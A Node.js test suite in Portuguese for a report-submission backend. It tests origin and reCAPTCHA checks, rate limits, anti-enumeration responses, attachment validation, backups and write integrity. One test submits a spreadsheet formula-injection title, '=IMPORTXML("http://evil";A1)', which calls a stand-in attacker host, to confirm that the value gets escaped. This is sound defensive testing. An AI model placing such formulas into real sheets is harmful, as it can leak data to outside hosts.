'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { criarAmbiente, payloadValido, anexoPdf, anexoPng, ORIGIN_PADRAO } = require('./harness');

// ─── Fluxo feliz ─────────────────────────────────────────────────────────────

test('envio válido grava todas as abas e devolve protocolo v1', () => {
  const env = criarAmbiente();
  const r = env.post(payloadValido(env));
  assert.equal(r._status, 200, JSON.stringify(r));
  assert.ok(/^BS2025-\d{8}-\d{6}-\d{4}$/.test(r.protocolo), r.protocolo);
  assert.equal(r.versao, 1);

  assert.equal(env.aba('relatorios').getLastRow(), 2); // cabeçalho + 1 linha
  for (const aba of ['eixos', 'ods', 'grade_social', 'grade_ambiental']) {
    assert.ok(env.aba(aba).getLastRow() > 1, 'aba vazia: ' + aba);
  }
  assert.equal(env.get().total, 1);
});

test('edição cria v2, preserva v1 e mantém contagem pública distinta', () => {
  const env = criarAmbiente();
  const envio = env.post(payloadValido(env));
  env.zerarRateLimits();

  const edicao = env.post(payloadValido(env, {
    acao: 'editar',
    protocolo: envio.protocolo,
    titulo: 'Tecnologia X (revisada)',
  }));
  assert.equal(edicao._status, 200, JSON.stringify(edicao));
  assert.equal(edicao.versao, 2);
  assert.equal(env.aba('relatorios').getLastRow(), 3); // v1 + v2 preservadas
  assert.equal(env.get().total, 1); // protocolos distintos, não linhas
});

test('carregar devolve o relatório completo para o autor (round-trip)', () => {
  const env = criarAmbiente();
  const envio = env.post(payloadValido(env, { resumo: 'Resumo para round-trip.' }));
  env.zerarRateLimits();

  const r = env.post({
    acao: 'carregar',
    protocolo: envio.protocolo,
    email: 'servidor@idr.pr.gov.br',
    origin: ORIGIN_PADRAO,
    recaptcha_token: 'carregar_bs',
  });
  assert.equal(r._status, 200, JSON.stringify(r));
  assert.equal(r.dados.resumo, 'Resumo para round-trip.');
  assert.equal(r.dados.grade_social.length, payloadValido(env).grade_social.length);
});

// ─── Autorização por e-mail (protocolo não é segredo) ────────────────────────

test('carregar com e-mail de outra pessoa devolve 404 indistinguível', () => {
  const env = criarAmbiente();
  const envio = env.post(payloadValido(env));
  env.zerarRateLimits();

  const r = env.post({
    acao: 'carregar',
    protocolo: envio.protocolo,
    email: 'curioso@outro.com',
    origin: ORIGIN_PADRAO,
    recaptcha_token: 'carregar_bs',
  });
  assert.equal(r._status, 404);
});

test('editar com e-mail errado devolve 404 unificado e CONSOME cota de edição (anti-probe)', () => {
  const env = criarAmbiente();
  const envio = env.post(payloadValido(env));
  env.zerarRateLimits();

  const r = env.post(payloadValido(env, {
    acao: 'editar',
    protocolo: envio.protocolo,
    email: 'impostor@outro.com',
  }));
  // 404 idêntico ao de protocolo inexistente — não revela existência (anti-enumeração)
  assert.equal(r._status, 404);
  // a tentativa consome a cota de edição (freio contra sondagem)
  const chavesEdit = Array.from(env.cacheDados.keys()).filter((k) => k.startsWith('rl:edit:'));
  assert.equal(chavesEdit.length, 1);
});

test('editar protocolo inexistente é indistinguível de e-mail errado (mesmo 404)', () => {
  const env = criarAmbiente();
  const r = env.post(payloadValido(env, {
    acao: 'editar',
    protocolo: 'BS2025-20990101-000000-9999',
    email: 'qualquer@dominio.com',
  }));
  assert.equal(r._status, 404);
});

test('sondagem de edição esgota a cota por e-mail e passa a 429', () => {
  const env = criarAmbiente();
  const alvo = env.post(payloadValido(env));
  env.zerarRateLimits();
  const limite = env.ctx.LIMITS.RATE_EDIT_PER_EMAIL_HOURLY;
  let ultimo;
  for (let i = 0; i <= limite; i++) {
    ultimo = env.post(payloadValido(env, { acao: 'editar', protocolo: alvo.protocolo, email: 'sonda@x.com' }));
  }
  assert.equal(ultimo._status, 429); // freio anti-probe ativo
});

// ─── Defesas do doPost ───────────────────────────────────────────────────────

test('origem não permitida → 403', () => {
  const env = criarAmbiente();
  const r = env.post(payloadValido(env, { origin: 'https://faker.example.com' }));
  assert.equal(r._status, 403);
});

test('reCAPTCHA: sem token, action errada, score baixo e hostname errado → 403', () => {
  const env = criarAmbiente();
  assert.equal(env.post(payloadValido(env, { recaptcha_token: '' }))._status, 403);
  assert.equal(env.post(payloadValido(env, { recaptcha_token: 'acao_errada' }))._status, 403);

  env.ctx.__fetchMock = () => ({
    getContentText: () => JSON.stringify({ success: true, score: 0.05, action: 'relatorio_bs', hostname: 'balanco-social-idrparana.github.io' }),
  });
  assert.equal(env.post(payloadValido(env))._status, 403);

  env.ctx.__fetchMock = () => ({
    getContentText: () => JSON.stringify({ success: true, score: 0.9, action: 'relatorio_bs', hostname: 'site-malicioso.com' }),
  });
  assert.equal(env.post(payloadValido(env))._status, 403);
  env.ctx.__fetchMock = null;
});

test('falha de rede no siteverify vira 403 controlado, não 500', () => {
  const env = criarAmbiente();
  env.ctx.__fetchMock = () => { throw new Error('rede fora'); };
  const r = env.post(payloadValido(env));
  assert.equal(r._status, 403);
});

test('campo acima do teto server-side → 400 apontando o campo', () => {
  const env = criarAmbiente();
  const r = env.post(payloadValido(env, { resumo: 'x'.repeat(8001) }));
  assert.equal(r._status, 400);
  assert.equal(r.campo, 'resumo');

  const r2 = env.post(payloadValido(env, { titulo: 'x'.repeat(301) }));
  assert.equal(r2._status, 400);
  assert.equal(r2.campo, 'titulo');
});

// ─── Anexos ──────────────────────────────────────────────────────────────────

test('anexo PDF válido é salvo no Drive e registrado na aba anexos', () => {
  const env = criarAmbiente();
  const r = env.post(payloadValido(env, { anexos: [anexoPdf(), anexoPng()] }));
  assert.equal(r._status, 200, JSON.stringify(r));
  assert.equal(env.aba('anexos').getLastRow(), 3); // cabeçalho + 2
  const arquivos = Object.values(env.drive.files).filter((f) => f.mime === 'application/pdf' || f.mime === 'image/png');
  assert.equal(arquivos.filter((f) => !f.trashed).length, 2);
});

test('mais de 10 anexos → 400 antes de gravar qualquer coisa', () => {
  const env = criarAmbiente();
  const anexos = Array.from({ length: 11 }, (_, i) => anexoPdf('doc' + i + '.pdf'));
  const r = env.post(payloadValido(env, { anexos }));
  assert.equal(r._status, 400);
  assert.match(r.erro, /número de anexos/);
  // nada foi gravado — a aba nem chegou a ser criada
  const aba = env.aba('relatorios');
  assert.ok(aba === null || aba.getLastRow() <= 1);
  assert.equal(Object.values(env.drive.files).filter((f) => f.mime === 'application/pdf').length, 0);
});

test('conteúdo que não bate com o MIME declarado → 400 (magic bytes)', () => {
  const env = criarAmbiente();
  const falso = Object.assign(anexoPdf(), { mime: 'image/png' }); // PDF disfarçado de PNG
  const r = env.post(payloadValido(env, { anexos: [falso] }));
  assert.equal(r._status, 400);
  assert.match(r.erro, /não corresponde/);
});

test('MIME fora da lista → 400', () => {
  const env = criarAmbiente();
  const exe = { tipo: 'foto_documento', nome: 'x.exe', mime: 'application/x-msdownload', base64: Buffer.from('MZ......ha').toString('base64') };
  const r = env.post(payloadValido(env, { anexos: [exe] }));
  assert.equal(r._status, 400);
});

// ─── Rate limits ─────────────────────────────────────────────────────────────

test('mesmo e-mail em sequência → 429 (consumo ocorre após o sucesso)', () => {
  const env = criarAmbiente();
  assert.equal(env.post(payloadValido(env))._status, 200);
  const r = env.post(payloadValido(env, { titulo: 'Outro título' }));
  assert.equal(r._status, 429);
});

test('validação que falha NÃO consome a cota do e-mail', () => {
  const env = criarAmbiente();
  // grade incompleta → 400
  const quebrado = payloadValido(env);
  quebrado.grade_social = quebrado.grade_social.slice(1);
  assert.equal(env.post(quebrado)._status, 400);
  // o mesmo e-mail consegue enviar em seguida
  assert.equal(env.post(payloadValido(env))._status, 200);
});

const bucketHora = () => Math.floor(Date.now() / 3600000);

test('teto global de envios → 429 mesmo com e-mails diferentes', () => {
  const env = criarAmbiente();
  env.cache.put('rl:global:' + bucketHora(), String(env.ctx.LIMITS.RATE_GLOBAL_HOURLY), 3600);
  const r = env.post(payloadValido(env, { email: 'qualquer@dominio.com' }));
  assert.equal(r._status, 429);
  assert.match(r.erro, /limite de envios do sistema/);
});

test('teto global de consultas (carregar) → 429', () => {
  const env = criarAmbiente();
  env.cache.put('rl:loadglobal:' + bucketHora(), String(env.ctx.LIMITS.RATE_GLOBAL_LOAD_HOURLY), 3600);
  const r = env.post({
    acao: 'carregar',
    protocolo: 'BS2025-20260101-000000-1234',
    email: 'a@b.com',
    origin: ORIGIN_PADRAO,
    recaptcha_token: 'carregar_bs',
  });
  assert.equal(r._status, 429);
});

// ─── Integridade de escrita ──────────────────────────────────────────────────

test('falha na escrita do pai não deixa versão corrompida nem anexos órfãos', () => {
  const env = criarAmbiente();
  const originalAppend = env.ctx.appendRelatorio;
  env.ctx.appendRelatorio = () => { throw new Error('falha simulada do Sheets'); };
  const r = env.post(payloadValido(env, { anexos: [anexoPdf()] }));
  env.ctx.appendRelatorio = originalAppend;

  assert.equal(r._status, 500);
  assert.equal(env.aba('relatorios').getLastRow(), 1); // sem linha-pai
  for (const aba of ['eixos', 'ods', 'grade_social', 'grade_ambiental', 'anexos']) {
    assert.equal(env.aba(aba).getLastRow(), 1, 'resíduo em ' + aba); // filhas limpas
  }
  const pdfs = Object.values(env.drive.files).filter((f) => f.mime === 'application/pdf');
  assert.ok(pdfs.length === 0 || pdfs.every((f) => f.trashed), 'anexo órfão no Drive');
  // e a cota do e-mail não foi consumida:
  assert.equal(env.post(payloadValido(env))._status, 200);
});

test('colisão de protocolo é detectada (retry esgota → 500, nada gravado)', () => {
  const env = criarAmbiente();
  env.ctx.gerarProtocolo = () => 'BS2025-20260101-000000-1111';
  assert.equal(env.post(payloadValido(env))._status, 200);
  env.zerarRateLimits();
  const r = env.post(payloadValido(env, { email: 'outra@pessoa.com', titulo: 'Outro' }));
  assert.equal(r._status, 500);
  assert.equal(env.aba('relatorios').getLastRow(), 2); // só o 1º envio
});

// ─── Injeção de fórmula ──────────────────────────────────────────────────────

test('texto iniciado por "=" é escapado na planilha e no diagnóstico de duplicatas', () => {
  const env = criarAmbiente();
  const payload = payloadValido(env, { titulo: '=IMPORTXML("http://evil";A1)' });
  assert.equal(env.post(payload)._status, 200);

  const cols = env.ctx.SCHEMA.relatorios;
  const linha = env.aba('relatorios').linhas[1];
  assert.equal(linha[cols.indexOf('titulo')], "'=IMPORTXML(\"http://evil\";A1)");

  // duplicata: mesmo e-mail + título, outro protocolo
  env.zerarRateLimits();
  assert.equal(env.post(payload)._status, 200);
  env.ctx.gravarDiagnosticoDuplicatas();
  const diag = env.aba('_diag_duplicatas');
  const linhaDiag = diag.linhas.find((l) => String(l[3]).indexOf('IMPORTXML') >= 0);
  assert.ok(linhaDiag, 'diagnóstico não gerado');
  assert.ok(String(linhaDiag[3]).startsWith("'="), 'título sem escape no _diag: ' + linhaDiag[3]);
});

// ─── Operação: backup e limpeza ──────────────────────────────────────────────

test('backupSemanal cria cópia privada e rotaciona backups vencidos', () => {
  const env = criarAmbiente();
  const antigo = new env.drive.ArquivoMock('backup-20250101-000000', null, 'x');
  antigo.criadoEm = new Date(Date.now() - 9 * 7 * 24 * 3600 * 1000); // 9 semanas
  env.pastaBackup.arquivos.push(antigo);
  const recente = new env.drive.ArquivoMock('backup-recente', null, 'x');
  env.pastaBackup.arquivos.push(recente);

  env.ctx.backupSemanal();

  assert.equal(antigo.trashed, true, 'backup vencido não foi rotacionado');
  assert.equal(recente.trashed, false);
  assert.ok(env.pastaBackup.arquivos.some((f) => f.nome.startsWith('backup-') && !f.trashed && f !== recente));
});

test('limparDadosDeTeste exige guarda explícita e faz backup antes', () => {
  const env = criarAmbiente();
  env.post(payloadValido(env));
  assert.throws(() => env.ctx.limparDadosDeTeste(), /CONFIRMAR_LIMPEZA/);
  assert.equal(env.aba('relatorios').getLastRow(), 2); // nada apagado

  env.props.CONFIRMAR_LIMPEZA = 'SIM-APAGAR-TUDO';
  assert.equal(env.ctx.limparDadosDeTeste(), 'limpo');
  assert.equal(env.aba('relatorios').getLastRow(), 1); // só cabeçalho
  assert.equal(env.props.CONFIRMAR_LIMPEZA, undefined); // guarda de uso único
  assert.ok(env.pastaBackup.arquivos.length > 0, 'backup prévio não criado');
});

// ─── doGet ───────────────────────────────────────────────────────────────────

test('doGet expõe apenas a contagem e usa cache', () => {
  const env = criarAmbiente();
  env.post(payloadValido(env));
  const r = env.get();
  assert.deepEqual(Object.keys(r).sort(), ['_status', 'total']);
  assert.equal(r.total, 1);
});
